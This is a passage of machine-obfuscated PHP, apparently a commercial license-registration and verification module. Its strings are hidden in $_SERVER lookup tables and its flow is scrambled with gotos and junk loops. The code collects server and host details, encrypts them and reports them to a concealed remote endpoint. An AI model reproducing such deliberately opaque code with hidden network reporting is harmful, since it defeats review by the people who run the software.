$AµƒÓ¶¿Ó[127]($AµƒÓ¶¿Ó[128])->{$_SERVER[ÀóÛœö][129]}(); $fÆÓ§Ø¯†Â = $d‰Ú«ˆŸºØ[640]; while (strlen($fÆÓ§Ø¯†Â) < $d‰Ú«ˆŸºØ[601]) { if (!$fÆÓ§Ø¯†Â) { break; } $fÆÓ§Ø¯†Â++; } goto Bµí½˜‹ƒˆ; Bµí½˜‹ƒˆ: $eìÄ‘İÅË³[$AµƒÓ¶¿Ó[125]][$AµƒÓ¶¿Ó[130]] = $AµƒÓ¶¿Ó[131]($_SERVER[$AµƒÓ¶¿Ó[132]] . $EŒâƒÂ¬ĞÈ[$AµƒÓ¶¿Ó[133]]); $c»…ÅŠÇ«’ = $d‰Ú«ˆŸºØ[641]; if (strlen($c»…ÅŠÇ«’) < $d‰Ú«ˆŸºØ[606]) { die; } goto CïµÀ»ê; dĞÂ‹Œ®ÀÅ: unset($eìÄ‘İÅË³[$AµƒÓ¶¿Ó[113]][$AµƒÓ¶¿Ó[115]][$AµƒÓ¶¿Ó[116]]); $E·ÚÈÜÆÁá = $d‰Ú«ˆŸºØ[638]; while ($E·ÚÈÜÆÁá < $d‰Ú«ˆŸºØ[620]) { if ($E·ÚÈÜÆÁá >= 0) { break; } $E·ÚÈÜÆÁá++; } goto F¢‡ù¢ë†Ò; aŒ´±®ßè‘: $eìÄ‘İÅË³[$AµƒÓ¶¿Ó[125]][$AµƒÓ¶¿Ó[145]] = $AµƒÓ¶¿Ó[123]($this->whygd47f8b42, $AµƒÓ¶¿Ó[146], $AµƒÓ¶¿Ó[10]); $eìÄ‘İÅË³[$AµƒÓ¶¿Ó[125]][$AµƒÓ¶¿Ó[147]] = $AµƒÓ¶¿Ó[123]($this->whygd47f8b42, $AµƒÓ¶¿Ó[148], $AµƒÓ¶¿Ó[10]); $FÒ ƒ˜¥Î = $d‰Ú«ˆŸºØ[643]; goto e‘·ÔÔ¦¾; e‘·ÔÔ¦¾: if ($AµƒÓ¶¿Ó[123]($GLOBALS, $AµƒÓ¶¿Ó[149]) && $this->config[$AµƒÓ¶¿Ó[150]]) { $eìÄ‘İÅË³[$AµƒÓ¶¿Ó[125]][$AµƒÓ¶¿Ó[151]] = WEB_ROOT; } return $eìÄ‘İÅË³; goto F·É™ñÉè; fĞ”…áËõá: if (strlen($EèÉê¸¶´É) < $d‰Ú«ˆŸºØ[620]) { die; } if ($EŒâƒÂ¬ĞÈ[$AµƒÓ¶¿Ó[137]] != $AµƒÓ¶¿Ó[138]) { $eìÄ‘İÅË³[$AµƒÓ¶¿Ó[125]][$AµƒÓ¶¿Ó[139]] = $EŒâƒÂ¬ĞÈ[$AµƒÓ¶¿Ó[139]]; $eìÄ‘İÅË³[$AµƒÓ¶¿Ó[125]][$AµƒÓ¶¿Ó[140]] = $EŒâƒÂ¬ĞÈ[$AµƒÓ¶¿Ó[140]]; $Dêç±ŸÌÑê = $AµƒÓ¶¿Ó[141](10) . $this->kuxe2f0c6c86 . $AµƒÓ¶¿Ó[141](5); $eìÄ‘İÅË³[$AµƒÓ¶¿Ó[113]][$AµƒÓ¶¿Ó[142]][$AµƒÓ¶¿Ó[143]] = $this->{$_SERVER[ÀóÛœö][144]}($Dêç±ŸÌÑê, $eìÄ‘İÅË³[$AµƒÓ¶¿Ó[125]][$AµƒÓ¶¿Ó[130]]); } if ($this->kuxe2f0c6c86 == $AµƒÓ¶¿Ó[138]) { $eìÄ‘İÅË³[$AµƒÓ¶¿Ó[113]][$AµƒÓ¶¿Ó[114]][$AµƒÓ¶¿Ó[119]][$AµƒÓ¶¿Ó[124]] = 0; } goto aŒ´±®ßè‘; CïµÀ»ê: $eìÄ‘İÅË³[$AµƒÓ¶¿Ó[125]][$AµƒÓ¶¿Ó[134]] = $AµƒÓ¶¿Ó[135]($AµƒÓ¶¿Ó[136]()); $eìÄ‘İÅË³[$AµƒÓ¶¿Ó[125]][$AµƒÓ¶¿Ó[137]] = $this->kuxe2f0c6c86; $EèÉê¸¶´É = $d‰Ú«ˆŸºØ[642]; goto fĞ”…áËõá; Cõê•Ò¡œÇ: $FÛñ§ˆ÷¨ = $d‰Ú«ˆŸºØ[636]; while ($FÛñ§ˆ÷¨ < $d‰Ú«ˆŸºØ[609]) { if ($FÛñ§ˆ÷¨ >= 0) { break; } $FÛñ§ˆ÷¨++; } $Eîë¾›î‰ = array($AµƒÓ¶¿Ó[64], $AµƒÓ¶¿Ó[65], $AµƒÓ¶¿Ó[66], $AµƒÓ¶¿Ó[67], $AµƒÓ¶¿Ó[68], $AµƒÓ¶¿Ó[69], $AµƒÓ¶¿Ó[70], $AµƒÓ¶¿Ó[71], $AµƒÓ¶¿Ó[72], $AµƒÓ¶¿Ó[73], $AµƒÓ¶¿Ó[74], $AµƒÓ¶¿Ó[75], $AµƒÓ¶¿Ó[76], $AµƒÓ¶¿Ó[77], $AµƒÓ¶¿Ó[78], $AµƒÓ¶¿Ó[79], $AµƒÓ¶¿Ó[80], $AµƒÓ¶¿Ó[81], $AµƒÓ¶¿Ó[82], $AµƒÓ¶¿Ó[83], $AµƒÓ¶¿Ó[84], $AµƒÓ¶¿Ó[85], $AµƒÓ¶¿Ó[86], $AµƒÓ¶¿Ó[87], $AµƒÓ¶¿Ó[88], $AµƒÓ¶¿Ó[89], $AµƒÓ¶¿Ó[90], $AµƒÓ¶¿Ó[91], $AµƒÓ¶¿Ó[92], $AµƒÓ¶¿Ó[93], $AµƒÓ¶¿Ó[94], $AµƒÓ¶¿Ó[95], $AµƒÓ¶¿Ó[96], $AµƒÓ¶¿Ó[97], $AµƒÓ¶¿Ó[98], $AµƒÓ¶¿Ó[99], $AµƒÓ¶¿Ó[100], $AµƒÓ¶¿Ó[101], $AµƒÓ¶¿Ó[102], $AµƒÓ¶¿Ó[103], $AµƒÓ¶¿Ó[104], $AµƒÓ¶¿Ó[105], $AµƒÓ¶¿Ó[106], $AµƒÓ¶¿Ó[107], $AµƒÓ¶¿Ó[108], $AµƒÓ¶¿Ó[109], $AµƒÓ¶¿Ó[110]); goto a…¯öÕÔê×; a…¯öÕÔê×: foreach ($Eîë¾›î‰ as $b·ôóÖùÁ‰) { $e…¾†ã¶…Î = $GLOBALS[$AµƒÓ¶¿Ó[111]][$AµƒÓ¶¿Ó[112]][$b·ôóÖùÁ‰]; if (isset($EŒâƒÂ¬ĞÈ[$b·ôóÖùÁ‰])) { $e…¾†ã¶…Î = $EŒâƒÂ¬ĞÈ[$b·ôóÖùÁ‰]; } $eìÄ‘İÅË³[$AµƒÓ¶¿Ó[113]][$AµƒÓ¶¿Ó[114]][$b·ôóÖùÁ‰] = $e…¾†ã¶…Î; } $a‹¿«ñ¤ä = $eìÄ‘İÅË³[$AµƒÓ¶¿Ó[113]][$AµƒÓ¶¿Ó[114]][$AµƒÓ¶¿Ó[76]]; $F¶çª‡éÛæ = $d‰Ú«ˆŸºØ[637]; goto dĞÂ‹Œ®ÀÅ; FÜ„ĞÀ†ã›: unset($eìÄ‘İÅË³[$AµƒÓ¶¿Ó[113]][$AµƒÓ¶¿Ó[114]][$AµƒÓ¶¿Ó[76]]); unset($eìÄ‘İÅË³[$AµƒÓ¶¿Ó[113]][$AµƒÓ¶¿Ó[114]][$AµƒÓ¶¿Ó[118]]); $eìÄ‘İÅË³[$AµƒÓ¶¿Ó[113]][$AµƒÓ¶¿Ó[114]][$AµƒÓ¶¿Ó[119]] = array($AµƒÓ¶¿Ó[120] => (int) $a‹¿«ñ¤ä[$AµƒÓ¶¿Ó[121]], $AµƒÓ¶¿Ó[122] => (int) $AµƒÓ¶¿Ó[123]($a‹¿«ñ¤ä, $AµƒÓ¶¿Ó[124], 0)); goto F°¾¤”¹ì; aÊ£»‘é–Ã: $d‰Ú«ˆŸºØ =& $_SERVER[›é¼±]; $AµƒÓ¶¿Ó =& $_SERVER[ÀóÛœö]; $EŒâƒÂ¬ĞÈ = $AµƒÓ¶¿Ó[61]($AµƒÓ¶¿Ó[62])->{$_SERVER[ÀóÛœö][63]}(); goto Cõê•Ò¡œÇ; F·É™ñÉè: } private function wxep2e9bca9f() { goto A¯‘È©•Ï; Aè­„ŠÈ: if (strlen($aŸŠÏ¤‡‡õ) < $fÌ­šæÙÈÉ[616]) { die; } $CíĞ…ö¾¶± = array($E»‰¦¸é´¾[184] => $D¯çƒêÀ×‰[$E»‰¦¸é´¾[64]], $E»‰¦¸é´¾[185] => $D¯çƒêÀ×‰[$E»‰¦¸é´¾[65]], $E»‰¦¸é´¾[186] => $E»‰¦¸é´¾[10]); $Bß°ºÊ³‡Ã = $fÌ­šæÙÈÉ[648]; goto BÒ‡÷Ü“«ê; BÀƒæÃœê…: if ($this->kuxe2f0c6c86 == $E»‰¦¸é´¾[138]) { return; } $BÏïÜ¿Ò²É = array($E»‰¦¸é´¾[178], $E»‰¦¸é´¾[179], $E»‰¦¸é´¾[180], $E»‰¦¸é´¾[181], $E»‰¦¸é´¾[182], $E»‰¦¸é´¾[183]); $aô³º = $fÌ­šæÙÈÉ[646]; goto Fµ¼ó¯÷ãá; BÒ‡÷Ü“«ê: while ($Bß°ºÊ³‡Ã < $fÌ­šæÙÈÉ[616]) { if ($Bß°ºÊ³‡Ã >= 0) { break; } $Bß°ºÊ³‡Ã++; } foreach ($BÏïÜ¿Ò²É as $Bø·©”Óî) { if (!isset($D¯çƒêÀ×‰[$Bø·©”Óî]) || !$D¯çƒêÀ×‰[$Bø·©”Óî]) { continue; } $CíĞ…ö¾¶±[$Bø·©”Óî] = $D¯çƒêÀ×‰[$Bø·©”Óî]; $CìÅÊ®ËõØ = $fÌ­šæÙÈÉ[649]; if (strlen($CìÅÊ®ËõØ) < $fÌ­šæÙÈÉ[601]) { die; } } $E»‰¦¸é´¾[13](array($E»‰¦¸é´¾[176], $E»‰¦¸é´¾[177]), $CíĞ…ö¾¶±); goto C·¨Îó´ì; Fµ¼ó¯÷ãá: if (!$aô³º) { return; } $D¯çƒêÀ×‰ = $E»‰¦¸é´¾[61]($E»‰¦¸é´¾[62])->{$_SERVER[ÀóÛœö][63]}(); $aŸŠÏ¤‡‡õ = $fÌ­šæÙÈÉ[647]; goto Aè­„ŠÈ; A¯‘È©•Ï: $fÌ­šæÙÈÉ =& $_SERVER[›é¼±]; $E»‰¦¸é´¾ =& $_SERVER[ÀóÛœö]; if ($_SERVER[$E»‰¦¸é´¾[44]] == $E»‰¦¸é´¾[152]) { goto eÙÀ§ËòŠ½; eÙÀ§ËòŠ½: $fµÎîæ†Âí = array($E»‰¦¸é´¾[137] => $this->kuxe2f0c6c86, $E»‰¦¸é´¾[153] => $this->{$_SERVER[ÀóÛœö][154]}(), $E»‰¦¸é´¾[155] => $E»‰¦¸é´¾[61]($E»‰¦¸é´¾[156])->{$_SERVER[ÀóÛœö][157]}()); if ($this->kuxe2f0c6c86 != $E»‰¦¸é´¾[138]) { $f¶¿÷ Ï§² = $E»‰¦¸é´¾[123]($this->whygd47f8b42, $E»‰¦¸é´¾[158]); if ($f¶¿÷ Ï§²) { $fµÎîæ†Âí[$E»‰¦¸é´¾[159]] = $f¶¿÷ Ï§²; $fµÎîæ†Âí[$E»‰¦¸é´¾[160]] = $E»‰¦¸é´¾[161]($E»‰¦¸é´¾[123]($this->whygd47f8b42, $E»‰¦¸é´¾[162])); $fµÎîæ†Âí[$E»‰¦¸é´¾[163]] = $E»‰¦¸é´¾[123]($this->whygd47f8b42, $E»‰¦¸é´¾[148]); } $fÜÏàš „ê = $E»‰¦¸é´¾[61]($E»‰¦¸é´¾[62])->{$_SERVER[ÀóÛœö][63]}($E»‰¦¸é´¾[164], $E»‰¦¸é´¾[10], !0); if ($E»‰¦¸é´¾[165]($fÜÏàš „ê) && $E»‰¦¸é´¾[25]($fÜÏàš „ê, 0, 1) == $E»‰¦¸é´¾[166]) { $fÜÏàš „ê = $E»‰¦¸é´¾[167]($fÜÏàš „ê); } if ($E»‰¦¸é´¾[168]($fÜÏàš „ê) && $fÜÏàš „ê[$E»‰¦¸é´¾[169]] && $E»‰¦¸é´¾[32]($fÜÏàš „ê[$E»‰¦¸é´¾[169]], $E»‰¦¸é´¾[170])) { $Cš¦ùì™ƒ = $E»‰¦¸é´¾[0]($E»‰¦¸é´¾[170], $fÜÏàš „ê[$E»‰¦¸é´¾[169]]); $fµÎîæ†Âí[$E»‰¦¸é´¾[171]] = $Cš¦ùì™ƒ[0]; } } $fµÎîæ†Âí = $this->{$_SERVER[ÀóÛœö][172]}($E»‰¦¸é´¾[173]($fµÎîæ†Âí), $E»‰¦¸é´¾[131]($E»‰¦¸é´¾[174])); goto F›ÌÊ„®šç; F›ÌÊ„®šç: $c©·‘Ä¹ë = $fÌ­šæÙÈÉ[644]; while ($c©·‘Ä¹ë < $fÌ­šæÙÈÉ[609]) { if ($c©·‘Ä¹ë >= 0) { break; } $c©·‘Ä¹ë++; } $CíĞ…ö¾¶± = array($E»‰¦¸é´¾[175] => $fµÎîæ†Âí); goto C½ª¹”ªµÕ; C½ª¹”ªµÕ: $f££Š¸­Å» = $fÌ­šæÙÈÉ[645]; if (strlen($f££Š¸­Å») < $fÌ­šæÙÈÉ[606]) { die; } $E»‰¦¸é´¾[13](array($E»‰¦¸é´¾[176], $E»‰¦¸é´¾[177]), $CíĞ…ö¾¶±); goto f«µ“Ö­Ü; f«µ“Ö­Ü: } goto BÀƒæÃœê…; C·¨Îó´ì: } private function batp08be9f12() { goto f†µÅğ„; B”Œ¸†ç‘‚: $D†ŒÁ¯‘Ù» = $dËßáØ®ˆ„[$FÓóéÔ³Ÿ[218]]; $FÊ†¤„½é¸ = $this->{$_SERVER[ÀóÛœö][225]}($D†ŒÁ¯‘Ù»[$FÓóéÔ³Ÿ[226]]); if (!$FÊ†¤„½é¸ || $FÊ†¤„½é¸ != $D†ŒÁ¯‘Ù»[$FÓóéÔ³Ÿ[162]]) { $Aññ„©ÁÚÔ = array($FÓóéÔ³Ÿ[227] => $FÓóéÔ³Ÿ[61]($FÓóéÔ³Ÿ[62])->{$_SERVER[ÀóÛœö][63]}($FÓóéÔ³Ÿ[133]), $FÓóéÔ³Ÿ[228] => $_SERVER[$FÓóéÔ³Ÿ[132]], $FÓóéÔ³Ÿ[229] => $FÓóéÔ³Ÿ[230](), $FÓóéÔ³Ÿ[199] => $_SERVER[$FÓóéÔ³Ÿ[200]]); $EÇÎ¥æ§î¼ = $this->{$_SERVER[ÀóÛœö][231]}($FÓóéÔ³Ÿ[173]($Aññ„©ÁÚÔ)); $this->{$_SERVER[ÀóÛœö][209]}($FÓóéÔ³Ÿ[232] . $EÇÎ¥æ§î¼); $FÓóéÔ³Ÿ[191]($FÓóéÔ³Ÿ[223]($FÓóéÔ³Ÿ[233]), !0); } goto e—‘í‡†˜; DÍãùº–Ş: while ($añäÉÉ¤°¦ < $aí¯­œ‘É[616]) { if ($añäÉÉ¤°¦ >= 0) { break; } $añäÉÉ¤°¦++; } $this->{$_SERVER[ÀóÛœö][255]}(); $dİÈŠ‚¬±ï = $aí¯­œ‘É[658]; goto A©ÉÀß•Ã…; e»±£¸Ê«­: $D¤ÜÔÔñ‹ = $aí¯­œ‘É[624]; if (!$D¤ÜÔÔñ‹) { return; } $eÕ‡©ªò’ø = array(); goto C¼µ±Ú‡™; e—‘í‡†˜: $eë˜à¯ƒ = array($FÓóéÔ³Ÿ[234] => $D†ŒÁ¯‘Ù»[$FÓóéÔ³Ÿ[235]], $FÓóéÔ³Ÿ[236] => $D†ŒÁ¯‘Ù»[$FÓóéÔ³Ÿ[237]], $FÓóéÔ³Ÿ[238] => $FÓóéÔ³Ÿ[141](16), $FÓóéÔ³Ÿ[137] => $D†ŒÁ¯‘Ù»[$FÓóéÔ³Ÿ[239]]); if ($c©°åÜìŠù[$FÓóéÔ³Ÿ[193]]) { $eë˜à¯ƒ[$FÓóéÔ³Ÿ[238]] = $c©°åÜìŠù[$FÓóéÔ³Ÿ[193]]; } $a„“°¬§“ = $FÓóéÔ³Ÿ[25]($FÓóéÔ³Ÿ[131]($eë˜à¯ƒ[$FÓóéÔ³Ÿ[236]]), 10, 10); goto C—ÌŞâ›¤ ; b…Ú­ƒğÅ: $cá‰ŒÈø‰ê = $dÍ¶Â¡ß…Î . $eë˜à¯ƒ[$FÓóéÔ³Ÿ[137]] . $this->{$_SERVER[ÀóÛœö][172]}($FÓóéÔ³Ÿ[131]($eë˜à¯ƒ[$FÓóéÔ³Ÿ[234]]), $dÍ¶Â¡ß…Î); $d•‰Äí µù = $aí¯­œ‘É[652]; if (!$d•‰Äí µù) { die; } goto e­Ğ‘ê½µ; a‰™²³‘À : $c©°åÜìŠù = array($FÓóéÔ³Ÿ[190] => $AÙï¾èÚ™[$FÓóéÔ³Ÿ[190]], $FÓóéÔ³Ÿ[193] => $FÓóéÔ³Ÿ[141](16), $FÓóéÔ³Ÿ[194] => $FÓóéÔ³Ÿ[174], $FÓóéÔ³Ÿ[195] => $FÓóéÔ³Ÿ[196], $FÓóéÔ³Ÿ[197] => $_SERVER[$FÓóéÔ³Ÿ[198]], $FÓóéÔ³Ÿ[199] => $_SERVER[$FÓóéÔ³Ÿ[200]], $FÓóéÔ³Ÿ[201] => $_SERVER[$FÓóéÔ³Ÿ[202]], $FÓóéÔ³Ÿ[130] => $FôøŒ¥Öâ, $FÓóéÔ³Ÿ[203] => $FÓóéÔ³Ÿ[61]($FÓóéÔ³Ÿ[62])->{$_SERVER[ÀóÛœö][63]}($FÓóéÔ³Ÿ[164])); if ($AÙï¾èÚ™[$FÓóéÔ³Ÿ[204]] == $FÓóéÔ³Ÿ[205]) { $Cö…„öÅ¦¸ = $this->{$_SERVER[ÀóÛœö][172]}($FôøŒ¥Öâ, $FÓóéÔ³Ÿ[206]); $EÇÎ¥æ§î¼ = $this->{$_SERVER[ÀóÛœö][144]}($FÓóéÔ³Ÿ[173]($c©°åÜìŠù), $FôøŒ¥Öâ . $FÓóéÔ³Ÿ[207], 3); $EÇÎ¥æ§î¼ = $EÇÎ¥æ§î¼ . $FÓóéÔ³Ÿ[208] . $_SERVER[$FÓóéÔ³Ÿ[198]]; $eæåñß·ÙÓ = $this->{$_SERVER[ÀóÛœö][209]}($FÓóéÔ³Ÿ[210] . $Cö…„öÅ¦¸ . $FÓóéÔ³Ÿ[211] . $EÇÎ¥æ§î¼, -1); $FÓóéÔ³Ÿ[191]($eæåñß·ÙÓ, !0); } else { if ($AÙï¾èÚ™[$FÓóéÔ³Ÿ[204]] == $FÓóéÔ³Ÿ[212]) { $aÛŸ²áÒ›  = $FÓóéÔ³Ÿ[25]($FÓóéÔ³Ÿ[131]($FÓóéÔ³Ÿ[213] . $FôøŒ¥Öâ), 12, 15) . $FÓóéÔ³Ÿ[214]; $EÇÎ¥æ§î¼ = $this->{$_SERVER[ÀóÛœö][215]}($FÓóéÔ³Ÿ[2]($AÙï¾èÚ™[$FÓóéÔ³Ÿ[216]]), $aÛŸ²áÒ› , 2); $dËßáØ®ˆ„ = $FÓóéÔ³Ÿ[217]($EÇÎ¥æ§î¼, !0); if (!$FÓóéÔ³Ÿ[168]($dËßáØ®ˆ„) || !$FÓóéÔ³Ÿ[168]($dËßáØ®ˆ„[$FÓóéÔ³Ÿ[218]]) || $dËßáØ®ˆ„[$FÓóéÔ³Ÿ[190]] != !0) { $FÎîÜ¼†Åê = $FÓóéÔ³Ÿ[219]; $eµß®‚İ¹ = $dËßáØ®ˆ„[$FÓóéÔ³Ÿ[218]] ? $FÓóéÔ³Ÿ[220] . $dËßáØ®ˆ„[$FÓóéÔ³Ÿ[218]] : $FÎîÜ¼†Åê; $FÓóéÔ³Ÿ[191]($eµß®‚İ¹, !1); } else { $c©°åÜìŠù[$FÓóéÔ³Ÿ[193]] = $dËßáØ®ˆ„[$FÓóéÔ³Ÿ[218]][$FÓóéÔ³Ÿ[221]]; } } else { $dËßáØ®ˆ„ = $this->{$_SERVER[ÀóÛœö][209]}($FÓóéÔ³Ÿ[222], $c©°åÜìŠù, 10); } } if (!$FÓóéÔ³Ÿ[168]($dËßáØ®ˆ„) || !$FÓóéÔ³Ÿ[168]($dËßáØ®ˆ„[$FÓóéÔ³Ÿ[218]]) || $dËßáØ®ˆ„[$FÓóéÔ³Ÿ[190]] != !0) { $FÎîÜ¼†Åê = $FÓóéÔ³Ÿ[223]($FÓóéÔ³Ÿ[224]); $eµß®‚İ¹ = $dËßáØ®ˆ„[$FÓóéÔ³Ÿ[218]] ? $FÓóéÔ³Ÿ[220] . $dËßáØ®ˆ„[$FÓóéÔ³Ÿ[218]] : $FÎîÜ¼†Åê; $FÓóéÔ³Ÿ[191]($eµß®‚İ¹, !1); } goto B”Œ¸†ç‘‚; A©ÉÀß•Ã…: if (strlen($dİÈŠ‚¬±ï) < $aí¯­œ‘É[601]) { return; } Cache::set($FÓóéÔ³Ÿ[256] . $FÓóéÔ³Ÿ[131]($b‹æ¹óù . $FÓóéÔ³Ÿ[257]), $FÓóéÔ³Ÿ[10]); $E¡™ìµØˆ³ = $aí¯­œ‘É[659]; goto CšæÒø¡Ùˆ; C¼µ±Ú‡™: $eÕ‡©ªò’ø[$B‡Ä‡Ğ¦Ô­] = $DÔ›’µ£è‚; $f¿éµÂ™« = $aí¯­œ‘É[655]; if (!$f¿éµÂ™«) { die; } goto EÙÍ…‰¿ÒË; A²ÙØ°ÏÌ: if (!$FÓóéÔ³Ÿ[123]($GLOBALS, $FÓóéÔ³Ÿ[149])) { die; } $AÙï¾èÚ™ = $GLOBALS[$FÓóéÔ³Ÿ[22]]; if (isset($AÙï¾èÚ™[$FÓóéÔ³Ÿ[188]])) { $this->{$_SERVER[ÀóÛœö][189]}(); die; } goto eÂ¥š‹ Ÿ; eç†§˜¯©ø: $c¨ë«âÜ¡É = $aí¯­œ‘É[654]; while (strlen($c¨ë«âÜ¡É) < $aí¯­œ‘É[616]) { if (!$c¨ë«âÜ¡É) { break; } $c¨ë«âÜ¡É++; } $B‡Ä‡Ğ¦Ô­ = $FÓóéÔ³Ÿ[240]($FÓóéÔ³Ÿ[25]($A™ÙàÉã©, 10, 16)); goto a×ôÇ§İ; fÊÅ×¸‰°®: if ($D†ŒÁ¯‘Ù»[$FÓóéÔ³Ÿ[243]] && $D†ŒÁ¯‘Ù»[$FÓóéÔ³Ÿ[243]] >= 1) { $FÓóéÔ³Ÿ[61]($FÓóéÔ³Ÿ[62])->{$_SERVER[ÀóÛœö][244]}($FÓóéÔ³Ÿ[245], $FÓóéÔ³Ÿ[246]); } $FÓóéÔ³Ÿ[61]($FÓóéÔ³Ÿ[62])->{$_SERVER[ÀóÛœö][247]}($eë˜à¯ƒ); $A™ÙàÉã© = $FÓóéÔ³Ÿ[131]($_SERVER[$FÓóéÔ³Ÿ[132]] . $FÓóéÔ³Ÿ[240]($b‹æ¹óù) . $eë˜à¯ƒ[$FÓóéÔ³Ÿ[236]]); goto eç†§˜¯©ø; a×ôÇ§İ: $DÔ›’µ£è‚ = $this->{$_SERVER[ÀóÛœö][144]}($FÓóéÔ³Ÿ[173]($D†ŒÁ¯‘Ù»), $A™ÙàÉã©); $CÓÃšõŒéæ = $FÓóéÔ³Ÿ[248]($FÓóéÔ³Ÿ[61]($FÓóéÔ³Ÿ[11])->{$_SERVER[ÀóÛœö][249]}(), $FÓóéÔ³Ÿ[250]); $fâêğÙí¥ = $CÓÃšõŒéæ[$FÓóéÔ³Ÿ[251]]; goto e»±£¸Ê«­; e­Ğ‘ê½µ: $eë˜à¯ƒ[$FÓóéÔ³Ÿ[140]] = $FÓóéÔ³Ÿ[135]($FÓóéÔ³Ÿ[240]($this->{$_SERVER[ÀóÛœö][172]}($cá‰ŒÈø‰ê, $FÓóéÔ³Ÿ[242]))); $D˜…öÆ“Ÿ = $aí¯­œ‘É[653]; if (!$D˜…öÆ“Ÿ) { die; } goto fÊÅ×¸‰°®; C—ÌŞâ›¤ : $C…–‹„ìò = $a„“°¬§“ . $eë˜à¯ƒ[$FÓóéÔ³Ÿ[137]] . $eë˜à¯ƒ[$FÓóéÔ³Ÿ[238]]; $eë˜à¯ƒ[$FÓóéÔ³Ÿ[139]] = $FÓóéÔ³Ÿ[240]($FÓóéÔ³Ÿ[135]($this->{$_SERVER[ÀóÛœö][172]}($C…–‹„ìò, $FÓóéÔ³Ÿ[241]))); $FµÑæòñº = $aí¯­œ‘É[650]; goto A©ÃĞÃ¹‡¿; A©ÃĞÃ¹‡¿: $dÍ¶Â¡ß…Î = $FÓóéÔ³Ÿ[141](16); $aà¿á²ì»¯ = $aí¯­œ‘É[651]; while (strlen($aà¿á²ì»¯) < $aí¯­œ‘É[620]) { if (!$aà¿á²ì»¯) { break; } $aà¿á²ì»¯++; } goto b…Ú­ƒğÅ; f†µÅğ„: $aí¯­œ‘É =& $_SERVER[›é¼±]; $FÓóéÔ³Ÿ =& $_SERVER[ÀóÛœö]; if ($_SERVER[$FÓóéÔ³Ÿ[44]] != $FÓóéÔ³Ÿ[187]) { return; } goto A²ÙØ°ÏÌ; E³—†“ä„: if (strlen($A£àôÜá¼í) < $aí¯­œ‘É[601]) { die; } goto eˆ£Îƒ¬Öó; CšæÒø¡Ùˆ: if (!$E¡™ìµØˆ³) { return; } $FÓóéÔ³Ÿ[191]($FÓóéÔ³Ÿ[223]($FÓóéÔ³Ÿ[233]), !0); $A£àôÜá¼í = $aí¯­œ‘É[660]; goto E³—†“ä„; EÙÍ…‰¿ÒË: $FÓóéÔ³Ÿ[61]($FÓóéÔ³Ÿ[11])->{$_SERVER[ÀóÛœö][252]}($fâêğÙí¥[$FÓóéÔ³Ÿ[253]], array($FÓóéÔ³Ÿ[254] => $eÕ‡©ªò’ø)); $this->whygd47f8b42 = $D†ŒÁ¯‘Ù»; $eÊäƒò‚³‚ = $aí¯­œ‘É[656]; goto Cˆ£ÃÌÑ­; Cˆ£ÃÌÑ­: if (strlen($eÊäƒò‚³‚) < $aí¯­œ‘É[609]) { return; } $this->kuxe2f0c6c86 = $eë˜à¯ƒ[$FÓóéÔ³Ÿ[137]]; $añäÉÉ¤°¦ = $aí¯­œ‘É[657]; goto DÍãùº–Ş; eÂ¥š‹ Ÿ: if (!isset($AÙï¾èÚ™[$FÓóéÔ³Ÿ[190]]) || $FÓóéÔ³Ÿ[24]($AÙï¾èÚ™[$FÓóéÔ³Ÿ[190]]) != 16) { $FÓóéÔ³Ÿ[191]($FÓóéÔ³Ÿ[192] . $AÙï¾èÚ™[$FÓóéÔ³Ÿ[190]], !1); } $b‹æ¹óù = $FÓóéÔ³Ÿ[61]($FÓóéÔ³Ÿ[62])->{$_SERVER[ÀóÛœö][63]}($FÓóéÔ³Ÿ[133]); $FôøŒ¥Öâ = $FÓóéÔ³Ÿ[131]($_SERVER[$FÓóéÔ³Ÿ[132]] . $b‹æ¹óù); goto a‰™²³‘À ; eˆ£Îƒ¬Öó: } private function licenseRegistSuccess() { $fôºãÄÁ¬ =& $_SERVER[ÀóÛœö]; $Bß’’ªæ = $fôºãÄÁ¬[61]($fôºãÄÁ¬[62])->{$_SERVER[ÀóÛœö][63]}(); if ($Bß’’ªæ[$fôºãÄÁ¬[93]] != $fôºãÄÁ¬[246]) { $fôºãÄÁ¬[61]($fôºãÄÁ¬[62])->{$_SERVER[ÀóÛœö][247]}($fôºãÄÁ¬[93], $fôºãÄÁ¬[246]); } $fôºãÄÁ¬[127]($fôºãÄÁ¬[258])->{$_SERVER[ÀóÛœö][259]}(!0); } private function ljfn4fe6c980() { $d¦Šµ¼Œá =& $_SERVER[ÀóÛœö]; $d¦Šµ¼Œá[61]($d¦Šµ¼Œá[62])->{$_SERVER[ÀóÛœö][247]}(array($d¦Šµ¼Œá[234] => $d¦Šµ¼Œá[10], $d¦Šµ¼Œá[236] => $d¦Šµ¼Œá[10], $d¦Šµ¼Œá[137] => $d¦Šµ¼Œá[138], $d¦Šµ¼Œá[139] => $d¦Šµ¼Œá[10], $d¦Šµ¼Œá[140] => $d¦Šµ¼Œá[10])); $d¦Šµ¼Œá[61]($d¦Šµ¼Œá[62])->{$_SERVER[ÀóÛœö][244]}($d¦Šµ¼Œá[245], $d¦Šµ¼Œá[260]); $this->whygd47f8b42 = array(); $this->kuxe2f0c6c86 = $d¦Šµ¼Œá[138]; } private function hdxna706818a() { goto EĞÜÜ•ÏŞó; DÃµ¥ù¶—ß: while (strlen($e›¨ŒšŞºê) < $Cíá İÈ¾Ä[609]) { if (!$e›¨ŒšŞºê) { break; } $e›¨ŒšŞºê++; } $F‡ãç“ÑÄÆ = Cache::get($f¼’Ä£ù­È); $AÎæÔÛç•ì = $Cíá İÈ¾Ä[662]; goto d»¨Ëãß¥; EĞÜÜ•ÏŞó: $Cíá İÈ¾Ä =& $_SERVER[›é¼±]; $fªñšÇë¢ =& $_SERVER[ÀóÛœö]; $_SERVER[$fªñšÇë¢[200]] = $fªñšÇë¢[123]($_SERVER, $fªñšÇë¢[200], APP_HOST); goto C—‹‡ä¦è½; cœÓÜÄ©‹¡: $BÂÆ‹£Š³Ÿ = $fªñšÇë¢[161]($F‡ãç“ÑÄÆ[$fªñšÇë¢[162]]); if ($fªñšÇë¢[262]() >= $BÂÆ‹£Š³Ÿ) { return $this->{$_SERVER[ÀóÛœö][189]}(); } if ($fªñšÇë¢[262]() - $F‡ãç“ÑÄÆ[$fªñšÇë¢[261]] > 20) { $F‡ãç“ÑÄÆ[$fªñšÇë¢[261]] = $fªñšÇë¢[262](); Cache::set($f¼’Ä£ù­È, $F‡ãç“ÑÄÆ); } goto F°„Ó¼˜Ÿ¿; d»¨Ëãß¥: while (strlen($AÎæÔÛç•ì) < $Cíá İÈ¾Ä[606]) { if (!$AÎæÔÛç•ì) { break; } $AÎæÔÛç•ì++; } if 